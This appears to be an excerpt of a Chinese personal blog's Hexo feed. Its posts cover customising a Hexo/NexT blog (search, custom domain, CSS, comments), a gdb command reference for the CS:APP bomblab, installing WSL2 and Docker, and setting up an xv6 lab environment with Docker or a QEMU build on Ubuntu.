<h2 id="添加搜索功能"><a href="#添加搜索功能" class="headerlink" title="添加搜索功能"></a>添加搜索功能</h2><p>打开博客的<strong>搜索文章的 功能</strong></p>
<p>下载<strong>搜索插件</strong>：</p>
<p>git bash黑窗口中输入：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb</span><br></pre></td></tr></table></figure>

<ol>
<li>主题 的 _config 配置文件中找到 <strong>local_search</strong>，下面的 <strong>enable输入true即可。</strong></li>
</ol>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318610.jpg" alt="blob">

<ol start="2">
<li>在根目录的 _config.yml 文件中 的末尾添加下面的内容：（选项的内容可以适当修改）</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># hexo-generator-searchdb</span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><pre><code>hexo cl &amp;&amp;hexo g &amp;&amp;hexo s
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">即可看见更新</span><br><span class="line"></span><br><span class="line">如以下界面</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071318618.jpg&quot; alt=&quot;blob&quot;&gt;</span><br><span class="line"></span><br><span class="line">## Github域名挂载</span><br><span class="line"></span><br><span class="line">&gt; github pages域名挂载,以阿里云域名为例子,其他域名类似</span><br><span class="line"></span><br><span class="line">### 第零步</span><br><span class="line"></span><br><span class="line">去[阿里云域名网站](https://wanwang.aliyun.com/newdomain/1yuan?domainCartTradeParams=dr_27906258_000&amp;_v_=6ff4a055f2f22f9d118832696bb06df3&amp;keyword=)买一个自己中意的域名,新人能享受1元一年服务,快剁手吧!</span><br><span class="line"></span><br><span class="line">### 第一步</span><br><span class="line"></span><br><span class="line">首先是用`ping`命令找到存放你的github pages的主机的IP地址，在终端里面用命令`ping xxx.github.io`便可完成，下图中红框内的就是我们要找的IP地址：</span><br><span class="line"></span><br><span class="line">![image-20240211133616800](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111411944.png)</span><br><span class="line"></span><br><span class="line">记住这个ip地址</span><br><span class="line"></span><br><span class="line">### 第二步</span><br><span class="line"></span><br><span class="line">在购买域名的提供商为域名添加解析。我是在阿里云买的域名，因此我以阿里云的为例。在域名控制台选择想要绑定的域名，并点击解析：</span><br><span class="line"></span><br><span class="line">![image-20240211133754793](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111411957.png)</span><br><span class="line"></span><br><span class="line">域名控制台</span><br><span class="line"></span><br><span class="line">然后添加如下两条记录：</span><br><span class="line"></span><br><span class="line">![image-20240211133415699](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111411972.png)</span><br><span class="line"></span><br><span class="line">添加记录</span><br><span class="line"></span><br><span class="line">### 第三步</span><br><span class="line"></span><br><span class="line">打开命令行/终端,切换到blog文件夹内的source目录</span><br><span class="line"></span><br><span class="line">输入以下命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>
touch CNAME
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![image-20240211193911379](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111941964.png)</span><br><span class="line"></span><br><span class="line">然后会生成一个叫做CNAME的文件,打开编辑,里面输入你买的域名,不用写`http`/`https`和`www`</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111941981.png&quot; alt=&quot;image-20240211193948472&quot; style=&quot;zoom:50%;&quot; /&gt;</span><br><span class="line"></span><br><span class="line">然后可以尝试`hexo g+hexo d`部署你的博客,然后等一下github更新就好了</span><br><span class="line"></span><br><span class="line">之后若是想检查域名是否挂载成功可以做如下操作:</span><br><span class="line"></span><br><span class="line">在Github中，找到托管博客的`xxx.github.io`项目：</span><br><span class="line"></span><br><span class="line">![image-20240211133953100](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111411984.png)</span><br><span class="line"></span><br><span class="line">进入到设置页面，并滑动到下方，找到**Github Pages**这一栏，在**Custom Domain看域名**是否是自己填的那个：</span><br><span class="line"></span><br><span class="line">![image-20240211134156078](https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402111411994.png)</span><br><span class="line"></span><br><span class="line">到这儿就已经完成了，等待10分钟(左右)就可以使用自定义的域名访问github pages所提供的页面了。</span><br><span class="line"></span><br><span class="line">## 博客背景图片美化</span><br><span class="line"></span><br><span class="line">### 添加背景图片</span><br><span class="line"></span><br><span class="line">在blog的根目录下的source文件夹下新建_data文件夹，并且新建style.styl文件</span><br><span class="line"></span><br><span class="line">路径如下所示：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
F:\hexo\blog\source\_data\styles.styl
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">之后在Next主题配置文件中中找到：`custom_file_path` 取消`style`的注释，意味着启用这个文件。</span><br><span class="line"></span><br><span class="line">打开复制粘贴如下内容：</span><br><span class="line"></span><br><span class="line">```css</span><br><span class="line">body &#123;</span><br><span class="line">    background:url(/images/background.png);</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-attachment: fixed; //是否滚动，fixed固定</span><br><span class="line">    background-size: cover;      //填充</span><br><span class="line">    background-position: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ol>
<ul>
<li>background: url：你的背景图片的地址，放置于<code>Next</code>主题文件下的<code>source/images/background.png</code></li>
<li>fixed：表示是否随鼠标滚动，选择fixed固定</li>
<li>size：表示填充</li>
<li>posi：表示位置</li>
</ul>
<h3 id="设置背景透明"><a href="#设置背景透明" class="headerlink" title="设置背景透明"></a>设置背景透明</h3><p>还是在这个<code>styles.style</code>文件里面，接着上面的内容下面直接复制粘贴：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">//文章背板的颜色rgb</span><br><span class="line"><span class="selector-class">.main-inner</span> &gt; <span class="selector-class">.sub-menu</span>, <span class="selector-class">.main-inner</span> &gt; <span class="selector-class">.post-block</span>, <span class="selector-class">.main-inner</span> &gt; <span class="selector-class">.tabs-comment</span>, <span class="selector-class">.main-inner</span> &gt; <span class="selector-class">.comments</span>, <span class="selector-class">.main-inner</span> &gt; <span class="selector-class">.pagination</span>&#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f5f5f56b</span>;      //此处使用十六进制颜色代码，         也可以使用rgba进行调色，</span><br><span class="line">                                //实际效果为白色透明色底板              rgba的第四参数即为透明度</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">body</span>&#123;               //修改主体字体颜色</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#000</span>;      //纯黑</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.posts-expand</span> <span class="selector-class">.post-title-link</span> &#123;    //标题颜色</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#000</span>;                //首页文章标题颜色， （默认为灰辨识度不高）</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.posts-expand</span> <span class="selector-class">.post-meta-container</span> &#123;    //标题下的日期颜色</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#880000</span>;             //此处修改为红色，可自行调用rgb调色</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//侧边框的透明度设置</span><br><span class="line"><span class="selector-class">.sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.7</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//菜单栏的调色</span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;     </span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.7</span>);</span><br><span class="line">&#125;</span><br><span class="line">//搜索框透明</span><br><span class="line"><span class="selector-class">.popup</span> &#123;        </span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.main-inner</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>);  //主体背景透明</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0px</span> <span class="number">40px</span> <span class="number">40px</span> <span class="number">40px</span>;  //调整组件位置</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中所有的内容都有注释，可以<strong>自己调节</strong></p>
<p>注意：0为完全透明，1为完全不透明</p>
<hr>
<h3 id="边框圆角设置"><a href="#边框圆角设置" class="headerlink" title="边框圆角设置"></a>边框圆角设置</h3><p>在 <code>style.style</code>同级文件夹下新建：<code>variables.styl</code>，并且在主题配置文件中同样取消<code>custom_file_path</code>的<code>variable</code>的注释，代表启用variable</p>
<p>然后打开这个文件，输入以下内容：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">// 圆角设置</span><br><span class="line">$<span class="attribute">border-radius</span>-inner     = <span class="number">30px</span> <span class="number">30px</span> <span class="number">30px</span> <span class="number">30px</span>;</span><br><span class="line">$<span class="attribute">border-radius</span>           = <span class="number">30px</span>;</span><br></pre></td></tr></table></figure>

<p>其中 数值表示圆角的弧度，可以自己设置</p>
<h2 id="添加代码复制按钮"><a href="#添加代码复制按钮" class="headerlink" title="添加代码复制按钮"></a>添加代码复制按钮</h2><p>修改主题配置文件</p>
<blockquote>
<p> 找到copy_button字段：</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"># Add copy button on codeblock</span><br><span class="line">copy_button:</span><br><span class="line">  enable: <span class="literal">true</span></span><br><span class="line">  # Show text copy result.</span><br><span class="line">  show_result: <span class="keyword">default</span></span><br><span class="line">  # Available values: <span class="keyword">default</span> | flat | mac</span><br><span class="line">  style:</span><br></pre></td></tr></table></figure>

<h2 id="添加Valine评论"><a href="#添加Valine评论" class="headerlink" title="添加Valine评论"></a>添加Valine评论</h2><p>注册<a href="https://console.leancloud.cn/">leancloud账号</a></p>
<p>创建开发版应用</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403262046220.png" alt="image-20240326203810380"></p>
<p>找到并记录APPID 和APPkey</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403262046242.png" alt="image-20240326203632922"></p>
<p>找到next主题中关于valine配置,修改appid和appkey，就可以使用评论功能了！</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403262046254.png" alt="image-20240326203055324"></p>
<p>填入appid和appkey，就可以重新部署了！</p>
]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>gdb使用指北</title>
    <url>/EATPOOP/gdb_use/2024/01/17/</url>
    <content><![CDATA[<blockquote>
<p>这里陈述的用法主要是为了反汇编和bomblab所服务(至少在目前是)</p>
</blockquote>
<h2 id="gdb用法指北"><a href="#gdb用法指北" class="headerlink" title="gdb用法指北"></a>gdb用法指北</h2><p>GDB（GNU Debugger）是一个强大的调试工具，用于分析和调试程序。以下是一些GDB的基础命令：</p>
<p><strong>启动程序：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb &lt;executable&gt;</span><br></pre></td></tr></table></figure>

<p>启动GDB并加载要调试的可执行文件。</p>
<p><strong>设置断点：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break &lt;function_name&gt;</span><br></pre></td></tr></table></figure>

<p>在指定的函数内设置断点，使程序在该函数内停止执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break &lt;line_number&gt;</span><br></pre></td></tr></table></figure>

<p>在指定行号上设置断点。</p>
<p><strong>运行程序：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run</span><br></pre></td></tr></table></figure>

<p>运行程序，直到遇到断点或程序结束。</p>
<p><strong>单步执行：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stepi  </span><br></pre></td></tr></table></figure>

<p>单步执行程序，进入函数内部。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">next</span><br></pre></td></tr></table></figure>

<p>单步执行程序，不进入函数内部，直到函数调用结束。</p>
<p><strong>完成当前函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">finish</span><br></pre></td></tr></table></figure>

<p><strong>查看变量的值：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print &lt;variable&gt;</span><br></pre></td></tr></table></figure>

<p>打印指定变量的值。</p>
<p><strong>查看堆栈帧：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">backtrace</span><br></pre></td></tr></table></figure>

<p>打印当前调用堆栈的信息。</p>
<p><strong>切换到指定帧：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frame &lt;frame_number&gt;</span><br></pre></td></tr></table></figure>

<p>切换到指定的堆栈帧。</p>
<p><strong>继续执行程序：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">continue</span><br></pre></td></tr></table></figure>

<p>从当前位置继续执行程序，直到遇到下一个断点或程序结束。</p>
<p><strong>查看符号表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -t bomb | less</span><br></pre></td></tr></table></figure>

<p><strong>反编译炸弹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.txt</span><br></pre></td></tr></table></figure>

<p><strong>退出GDB：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quit</span><br></pre></td></tr></table></figure>

<p>退出GDB。</p>
<h2 id="反汇编"><a href="#反汇编" class="headerlink" title="反汇编"></a>反汇编</h2><ol>
<li><p><strong>反汇编函数：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disassemble &lt;function_name&gt;</span><br></pre></td></tr></table></figure>

<p>显示指定函数的汇编代码。</p>
</li>
<li><p><strong>反汇编当前代码：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disassemble</span><br></pre></td></tr></table></figure>

<p>可以缩写为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disas</span><br></pre></td></tr></table></figure>

<p>显示当前执行点附近的汇编代码。</p>
</li>
<li><p><strong>设置反汇编指令数目：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set disassembly-flavor &lt;flavor&gt;</span><br></pre></td></tr></table></figure>

<p>设置反汇编输出的指令数目。<code>&lt;flavor&gt;</code> 可以是 <code>att</code> 或 <code>intel</code>，表示使用AT&amp;T或Intel语法。</p>
</li>
<li><p><strong>查看寄存器值：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">info registers</span><br></pre></td></tr></table></figure>

<p>显示当前寄存器的值。</p>
</li>
<li><p><strong>在反汇编中设置断点：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">break *&lt;address&gt;</span><br></pre></td></tr></table></figure>

<p>在指定地址处设置断点，可以是汇编指令的地址。</p>
</li>
<li><p><strong>查看内存内容：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x/&lt;n&gt;x &lt;address&gt;</span><br></pre></td></tr></table></figure>

<p>显示从指定地址开始的 <code>n</code> 个十六进制字节。例如，<code>x/4x $rsp</code> 显示栈顶部的四个字节。</p>
</li>
<li><p><strong>查看指令执行前后的内存变化：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">display/i $pc</span><br></pre></td></tr></table></figure>

<p>每次程序停下来时，显示当前指令的反汇编，并在每步执行后继续显示。</p>
</li>
<li><p><strong>进入&#x2F;离开汇编级别：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">layout asm</span><br></pre></td></tr></table></figure>

<p>进入汇编级别的布局，显示源代码和汇编代码。可以使用 <code>Ctrl+X</code>，然后按 <code>2</code> 来切换到汇编级别。</p>
</li>
<li><p><strong>设置汇编级别布局显示选项：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set asm-options</span><br></pre></td></tr></table></figure>

<p>设置汇编级别布局的显示选项，例如，<code>set asm-options intel</code> 切换到Intel语法。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker安装和踩坑</title>
    <url>/EATPOOP/Docker_use/2023/12/06/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直在折腾Mit6.s081的课程实验环境配置和csapp，在网上搜集了大量资料，整理出了以下教程，不得不说Docker真的是个超级无敌伟大的发明</p>
<blockquote>
<p>M系列芯片的macbook还是别考虑做实验了,反正我没折腾好</p>
</blockquote>
<p>众所周知，Win11&#x2F;10下有个子linux系统叫wsl，他比虚拟机更加方便快捷。</p>
<h1 id="WSL2安装"><a href="#WSL2安装" class="headerlink" title="WSL2安装"></a>WSL2安装</h1><blockquote>
<p>在WIN10&#x2F;11下的wsl2踩坑和安装<a href="https://juejin.cn/post/7099108145825316894#heading-0">参考文章</a></p>
</blockquote>
<h2 id="1-安装-打开Hyper-V"><a href="#1-安装-打开Hyper-V" class="headerlink" title="1.安装&#x2F;打开Hyper-V"></a>1.安装&#x2F;打开Hyper-V</h2><p>这是 Docker Desktop for Windows 所使用的虚拟机。 但是这个虚拟机一旦启用，QEMU、VirtualBox 或 VMWare Workstation 15 及以下版本将无法使用！（所以更新到VMWare Workstation 16就万事大吉了）</p>
<p>首先右键开始菜单，选择应用与功能<br> <img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315138.awebp" alt="1513668234-4363-20171206211136409-1609350099.png"></p>
<p>然后点击程序与功能<br> <img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315168.awebp" alt="1513668234-4368-20171206211345066-1430601107.png"></p>
<p>选择启用或关闭Windows功能<br> <img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315176.awebp" alt="1513668234-9748-20171206211435534-1499766232.png"></p>
<p>这是第一种情况<br> <img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315190.awebp" alt="1513668234-6433-20171206211858191-1177002365.png"></p>
<p>如果你的界面是这样的，且没有下列选项中的Hyper-V，则先选中打钩的下面三个，然后确定，再参考<a href="https://link.juejin.cn/?target=https://blog.csdn.net/lanxingxing666666/article/details/111354089">win10没有Hyper-v的解决方法</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315198.awebp" alt="Snipaste_2022-05-18_00-26-50.png"></p>
<h2 id="2-将WSL版本升级为WSL2"><a href="#2-将WSL版本升级为WSL2" class="headerlink" title="2.将WSL版本升级为WSL2"></a>2.将WSL版本升级为WSL2</h2><p>首先看看版本号是否为2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl -l -v</span><br></pre></td></tr></table></figure>

<h3 id="没有发行版"><a href="#没有发行版" class="headerlink" title="没有发行版"></a>没有发行版</h3><p>输入以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --install</span><br></pre></td></tr></table></figure>

<h3 id="已有发行版"><a href="#已有发行版" class="headerlink" title="已有发行版"></a>已有发行版</h3><p>若版本为1，使用命令 </p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">wsl --set-<span class="keyword">default</span>-version <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>发现版本还没改过来</p>
<p>管理员权限打开终端，输入命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart</span><br></pre></td></tr></table></figure>

<p>然后下载Linux的内核更新包并安装 x64：<a href="https://link.juejin.cn/?target=https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi">wslstorestorage.blob.core.windows.net&#x2F;wslblob&#x2F;wsl…</a></p>
<p>仍然是管理员权限下打开终端，先查看更新前的WSL版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl -l -v</span><br></pre></td></tr></table></figure>

<p>输入更新的命令：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">wsl.exe --set-version Ubuntu <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p>更新命令有的用的：<code>wsl --set-version Ubuntu 2</code>，但是在我的电脑上报错：不存在具有提供的名称的分布。 解决方法就是把wsl改成wsl.exe.</p>
<h3 id="版本号为2"><a href="#版本号为2" class="headerlink" title="版本号为2"></a>版本号为2</h3><p>这步完成，开始安装docker</p>
<h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1><blockquote>
<p>建议直接官网下载</p>
</blockquote>
<p><a href="https://docs.docker.com/desktop/install/windows-install/">DOCKER FOR WINDOWS</a></p>
<p><a href="https://docs.docker.com/desktop/install/mac-install/">DOCKER FOR LINUX</a></p>
<p><a href="https://docs.docker.com/desktop/install/mac-install/">DOCKER FOR MAC</a></p>
<p><strong>对于mac用户而言，直接去官网上下载docker，注意intel和apple版本</strong></p>
<p>一通安装，等它转完圈圈，就算是成功安装，可以开始环境配置了！</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404232129489.png" alt="image-20240423211431827"></p>
<p>进入到这个界面就算是成功了。</p>
<p>下面是docker安装成功后cmd的界面：</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202404232128758.png" alt="image-20240423211517826"></p>
]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>ubuntu配置xv6环境</title>
    <url>/EATPOOP/xv6_environment/2023/12/06/</url>
    <content><![CDATA[<blockquote>
<p>Author:师傅 </p>
<p>Editor:Vite</p>
<p>经过无数次尝试和重装，耗时近40个小时，终于探索出一条用vscode调试xv6的可行性道路</p>
</blockquote>
<h1 id="Docker安装XV6环境"><a href="#Docker安装XV6环境" class="headerlink" title="Docker安装XV6环境"></a>Docker安装XV6环境</h1><ol>
<li>打开Docker，打开CMD（windows）或者终端（mac），刷入以下命令拉取镜像。这个 images （400多MB）开箱即用,环境已经配置好了。</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#下载镜像</span><br><span class="line">docker pull linxi177229/mit6.s081:latest</span><br><span class="line"># 查看</span><br><span class="line">docker images</span><br><span class="line"># 启动容器（里面有配置好的环境 和 PDF 资料）</span><br><span class="line">docker run --name xv6 -itd linxi177229/mit6.s081:latest</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>打开VScode，在扩展市场安装Docker插件，然后进入，右键对应容器，选择<strong>附加VisualStudioCode</strong>，然后vscode会自动挂载容器，会弹出一个新的窗口。</li>
<li>开始愉快的实验吧！</li>
<li>测试环境</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd xv6-labs-2020</span><br><span class="line"># 开启一个 shell 手动运行那些 usr/ 下的程序来测试</span><br><span class="line">make qemu </span><br><span class="line"></span><br><span class="line"> #看目录下的各级目录</span><br><span class="line"> ls</span><br><span class="line"> </span><br><span class="line"># 自动化测试：make grade 可以获得得分情况</span><br><span class="line">make grade</span><br><span class="line"></span><br><span class="line"># 或者可以使用 进行单个测试</span><br><span class="line">./grade-具体lab名字 part名字</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>退出方式</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 在另一个新开的终端执行 </span></span><br><span class="line">pkill -f qemu  </span><br></pre></td></tr></table></figure>

<ol start="6">
<li>调试方法 GDB</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 第一个 terminal</span></span><br><span class="line"><span class="built_in">cd</span> xv6-labs-2020</span><br><span class="line"><span class="comment"># 第一次执行 gdb 需要 执行 下面条语句 </span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;add-auto-load-safe-path <span class="subst">$(pwd)</span>/.gdbinit &quot;</span> &gt;&gt; ~/.gdbinit </span><br><span class="line"><span class="comment"># 第一次执行</span></span><br><span class="line">make CPUS=1 qemu-gdb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二个 terminal</span></span><br><span class="line"><span class="built_in">cd</span> xv6-labs-2020</span><br><span class="line">gdb-multiarch</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来就和使用 平常的 gdb 一样了， layout split 是一个很棒的用法</span></span><br><span class="line"><span class="comment"># 在 gdb 中输入 kill 即可 退出</span></span><br><span class="line"><span class="comment"># 或者 在第三个 teminal 中输入 pkill -f qemu 也可以退出</span></span><br></pre></td></tr></table></figure>

<p><a href="https://pic.imgdb.cn/item/65a3b3dd871b83018aa931bf.jpg"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071315207.jpg"></a></p>
<h1 id="Ubuntu安装XV6环境"><a href="#Ubuntu安装XV6环境" class="headerlink" title="Ubuntu安装XV6环境"></a>Ubuntu安装XV6环境</h1><h2 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><p>按照上一个说明的流程，安装一个新的虚拟机并记住它的名字。记住<strong>账户名在下文统一用username指代账户名</strong>，下面要更新下载源。</p>
<ol>
<li>备份源列表</li>
</ol>
<p>Ubuntu配置的默认源并不是国内的服务器，下载更新软件都比较慢。首先备份源列表文件<strong>sources.list</strong>：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 首先备份源列表</span><br><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list_backup</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>打开sources.list文件修改</li>
</ol>
<p>选择合适的源，替换原文件的内容，保存编辑好的文件, 以阿里云更新服务器为例（可以分别测试阿里云、清华、中科大、163源的速度，选择最快的）：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line"># 打开sources.list文件</span><br><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>

<p>编辑**&#x2F;etc&#x2F;apt&#x2F;sources.list**文件, 在文件最前面添加阿里云镜像源：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">#  阿里源</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>刷新列表</li>
</ol>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">sudo apt-get install build-essential</span><br></pre></td></tr></table></figure>

<p>下载速度瞬间就起飞了。</p>
<h2 id="配置riscv-qemu-clone"><a href="#配置riscv-qemu-clone" class="headerlink" title="配置riscv+qemu+clone"></a>配置riscv+qemu+clone</h2><pre><code>//下载必要组件并解压
sudo apt install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu libglib2.0-dev libpixman-1-dev gcc-riscv64-unknown-elf

wget https://download.qemu.org/qemu-5.1.0.tar.xz

tar xvf qemu-5.1.0.tar.xz

cd qemu-5.1.0
</code></pre>
<p>接下来运行这条命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./configure --disable-kvm --disable-werror --prefix=/usr/local --target-list=&quot;riscv64-softmmu&quot;</span><br></pre></td></tr></table></figure>

<p>如果报这个错误:</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ERROR: glib-2.48 gthread-2.0 is required to compile QEMU</span><br></pre></td></tr></table></figure>

<p>解决方法为<code>sudo apt install libglib2.0-dev</code></p>
<p>还可能报这个错误：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ERROR: pixman &gt;= 0.21.8 not present.</span><br><span class="line">       Please install the pixman devel package.</span><br></pre></td></tr></table></figure>

<p>解决方法为<code>sudo apt install libpixman-1-dev</code></p>
<p>之后编译,克隆源代码并初始运行</p>
